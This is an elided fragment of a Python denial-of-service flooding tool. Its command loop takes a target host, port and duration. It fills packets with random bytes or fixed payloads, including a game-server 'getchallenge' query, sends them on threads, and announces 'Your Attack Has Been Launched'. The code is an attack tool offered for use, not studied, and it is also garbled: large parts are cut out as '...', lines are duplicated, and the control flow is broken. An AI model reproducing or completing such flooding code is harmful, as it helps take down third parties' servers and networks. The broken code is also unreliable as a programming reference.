...
def main():
	...
	while True:
		bots = random._urandom(int(random.randint(7035,60005)))
		bots = random._urandom(int(random.randint(7035,65531)))
		avi = pack = random._urandom(int(random.randint(7035,60007)))
		avi = random._urandom(int(random.randint(7035,10000007)))
		...
		if sinput == "cls":
			...
			try:
				if running >= 1:
					...
					main()
						...
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						pack = random._urandom(int(random.randint(7035,50007)))
			...
			try:
				if running >= 1:
					...
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = pack = random._urandom(int(random.randint(7035,60007)))
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
			...
			try:
				if running >= 1:
					...
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = random._urandom(int(random.randint(7035,60007)))
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
			...
			try:
				if running >= 1:
					...
					socket.gethostbyname(host)
					pack = random._urandom(int(random.randint(7035,60007)))
					pumch = random._urandom(int(pack))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
			...
			try:
				if running >= 1:
					...
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = random._urandom(int(random.randint(7035,900007)))
					punch = random._urandom(int(pack))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			...
			try:
				if running >= 1:
					...
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = random._urandom(int(random.randint(7035,10000007)))
					punch = random._urandom(int(pack))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
